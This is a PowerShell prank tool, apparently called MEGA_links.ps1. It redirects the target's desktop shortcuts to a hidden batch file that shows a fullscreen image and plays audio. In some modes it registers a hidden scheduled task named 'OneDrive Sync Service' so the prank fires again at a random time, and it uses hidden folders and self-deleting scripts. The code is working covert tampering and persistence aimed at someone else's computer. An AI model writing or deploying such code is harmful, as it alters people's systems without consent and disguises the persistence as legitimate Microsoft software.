# Selection mode

if ($args -contains "without_empathy") {
    Write-Host "without_empathy mode activated ! ima f*ck that sh*t up !!!"
    $mode="without_empathy"
} elseif ($args -contains "with_empathy") {
    Write-Host "with_empathy mode activated, because he probably stronger than you idk"
    $mode="with_empathy"
} elseif ($args -contains "save_him_from_hell") {
    Write-Host "At least you're alive bruh`ni hope it was worth it"
    $mode="save_him_from_hell"
} elseif ($args -contains "wtf_is_wrong_with_you") {
    Write-Host "yoooo wtf is wrong with you ?! you probably hate him right ??"
    $mode="wtf_is_wrong_with_you"
} elseif ($args -contains "ah_shit..._here_we_go_again") {
    $mode="ah_shit..._here_we_go_again"
} elseif ($args -contains "get_shrekt") {
    $mode="get_shrekt"
} else {
    Write-Host "wtf are you doing ? you just have to select a mode to use that sh*t"
    exit
}

if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shrekt")) {
    
    # Get the links on the Desktop (SAFE MODE)
    $links = @()
    $WshShell = New-Object -ComObject WScript.Shell

    $desktopPaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\OneDrive\Desktop"
    )

    foreach ($path in $desktopPaths) {

        if (Test-Path $path) {

            Get-ChildItem "$path\*.lnk" -ErrorAction SilentlyContinue | ForEach-Object {

                try {
                    $shortcut = $WshShell.CreateShortcut($_.FullName)

                    # Ignore special shortcuts
                    if ([string]::IsNullOrWhiteSpace($shortcut.TargetPath)) { continue }
                    if ($shortcut.TargetPath -like "::{*}") { continue }
                    if ($shortcut.TargetPath -match "^shell:") { continue }
                    if ($shortcut.TargetPath -match "control.exe|explorer.exe") { continue }

                    $links += $_

                } catch {
                    continue
                }
            }

        }
    }

    # If we got at least one link...
    if($links.Count -ge 1){
        
        # Backup the links
        New-Item -ItemType Directory "$env:USERPROFILE\Backup" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "$env:USERPROFILE\Backup" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

        $i=0

        foreach ($link in $links) {
            if (!(Test-Path "$env:USERPROFILE\Backup\$i\$($link.Name)")) {
                New-Item -ItemType Directory "$env:USERPROFILE\Backup\$i" -ErrorAction SilentlyContinue
                Copy-Item $link.FullName "$env:USERPROFILE\Backup\$i" -ErrorAction SilentlyContinue
                "$i;$($link.FullName)" | Out-File -Append "$env:USERPROFILE\Backup\links.db" -Encoding ascii
                $i++
            }
        }

        # Install the script
        if (!(Test-Path "$env:USERPROFILE\Data")) {
            New-Item -ItemType Directory "$env:USERPROFILE\Data" -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "$env:USERPROFILE\Data" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        }
        if (!(Test-Path "$env:USERPROFILE\Data\image.png") -or !(Test-Path "$env:USERPROFILE\Data\audio.wav")) {
            Expand-Archive -Path ".\src\data.zip" -DestinationPath "$env:USERPROFILE\Data\"
        }
        if (!(Test-Path "$env:USERPROFILE\Data\MEGA_links.ps1")) {
            Copy-Item ".\MEGA_links.ps1" "$env:USERPROFILE\Data\"
        }
        if (!(Test-Path "$env:USERPROFILE\Data\src\data.zip")) {
            New-Item -ItemType Directory "$env:USERPROFILE\Data\src" -ErrorAction SilentlyContinue
            Copy-Item ".\src\data.zip" "$env:USERPROFILE\Data\src"
        }
        if (!(Test-Path "$env:USERPROFILE\Data\save_him_from_hell.bat")) {
            Copy-Item ".\save_him_from_hell.bat" "$env:USERPROFILE\Data\"
        }

        # Setup the mode
        if ($mode -eq "without_empathy") {

@"
@echo off

Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "save_him_from_hell"

Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"

del /f /q "$env:USERPROFILE\Data\image.png"
del /f /q "$env:USERPROFILE\Data\audio.wav"

timeout /t 5 >nul
del /f /q "%~f0"

"@ | Out-File "$env:USERPROFILE\Data\run.bat" -Encoding ascii

        }


        elseif ($mode -eq "with_empathy") {

@"
@echo off

Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "save_him_from_hell"

"$env:USERPROFILE\Data\image.png"

del /f /q "$env:USERPROFILE\Data\image.png"
del /f /q "$env:USERPROFILE\Data\audio.wav"

timeout /t 5 >nul
del /f /q "%~f0"

"@ | Out-File "$env:USERPROFILE\Data\run.bat" -Encoding ascii

        }


        elseif ($mode -eq "wtf_is_wrong_with_you") {

@"
@echo off

Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "ah_shit..._here_we_go_again"

Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"

"@ | Out-File "$env:USERPROFILE\Data\run.bat" -Encoding ascii

        }


        # Change the links on the Desktop
        $WshShell = New-Object -ComObject WScript.Shell

        foreach ($link in $links) {
            $shortcut = $WshShell.CreateShortcut($link.FullName)

            $shortcut.TargetPath = "$env:USERPROFILE\Data\run.bat"
            $shortcut.WindowStyle = 7

            $shortcut.Save()

        }

    }

} elseif ($mode -eq "save_him_from_hell"){
    
    # Log the recovery (in case you get an error)
    Start-Transcript "$env:USERPROFILE\Backup\Data_Recovery.log" -Append

    # Restore where the links were
    $data = @{}

    foreach ($raw in Get-Content "$env:USERPROFILE\Backup\links.db") {
        $parts = $raw.Split(";",2)
        $data[$parts[0]] = $parts[1]
    }

    foreach ($id in $data.Keys) {
        Move-Item "$env:USERPROFILE\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
    }

    Remove-Item "$env:USERPROFILE\Backup\links.db"
    Remove-Item "$env:USERPROFILE\Data\src\data.zip"
    Remove-Item "$env:USERPROFILE\Data\src"

    foreach ($id in $data.Keys){
        Remove-Item "$env:USERPROFILE\Backup\$id"
    }

    # Check if the scheduled task is installed, if it is delete it
    $taskName = "OneDrive Sync Service"

    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    # Delete the script
    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\MEGA_links.ps1`"" -WindowStyle Hidden
    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\save_him_from_hell.bat`"" -WindowStyle Hidden

    # stop logging
    Stop-Transcript



} elseif ($mode -eq "ah_shit..._here_we_go_again") {
    
    # Log the recovery (in case you get an error)
    Start-Transcript "$env:USERPROFILE\Backup\Data_Recovery.log" -Append

    # Restore where the links were
    $data = @{}

    foreach ($raw in Get-Content "$env:USERPROFILE\Backup\links.db") {
        $parts = $raw.Split(";",2)
        $data[$parts[0]] = $parts[1]
    }

    foreach ($id in $data.Keys) {
        Move-Item "$env:USERPROFILE\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
    }

    Remove-Item "$env:USERPROFILE\Backup\links.db"

    foreach ($id in $data.Keys){
        Remove-Item "$env:USERPROFILE\Backup\$id"
    }

    # Stop logging
    Stop-Transcript

    # Get a random date/time
    $today = Get-Date
    $randomDays = Get-Random -Minimum 0 -Maximum 7
    $randomHour = Get-Random -Minimum 0 -Maximum 23
    $randomMinute = Get-Random -Minimum 0 -Maximum 59

    $randomDateTime = $today.AddDays($randomDays).Date.AddHours($randomHour).AddMinutes($randomMinute)

    # Set the name of the task
    $taskName = "OneDrive Sync Service"

    # Set the action of the task
    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-NoProfile -WindowStyle Hidden -File `"$env:USERPROFILE\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""

    # Set the date/time execution of the task
    $trigger = New-ScheduledTaskTrigger -Once -At $randomDateTime

    # Set the settings of the task
    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -StartWhenAvailable `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -ExecutionTimeLimit (New-TimeSpan -Minutes 5) `
        -IdleDuration 30

    # If the task exist, delete it
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    # And save the new task
    Register-ScheduledTask `
        -TaskName $taskName `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -Force


} elseif ($mode -eq "get_shrekt") {
    
    # Get the audio
    $audioPath = "$env:USERPROFILE\Data\audio.wav"

    $player = New-Object System.Media.SoundPlayer
    $player.SoundLocation = $audioPath

    # Start the audio
    $player.Play()

    # Get the picture
    Add-Type -AssemblyName PresentationFramework

    $window = New-Object Windows.Window
    $window.WindowStyle = 'None'
    $window.WindowState = 'Maximized'
    $window.Topmost = $true
    $window.Background = 'Black'

    $image = New-Object Windows.Controls.Image
    $image.Source = [Windows.Media.Imaging.BitmapImage]::new(
        [Uri]"$env:USERPROFILE\Data\image.png"
    )
    $image.Stretch = 'Uniform'

    $window.Content = $image

    # Show the picture
    $window.ShowDialog()

}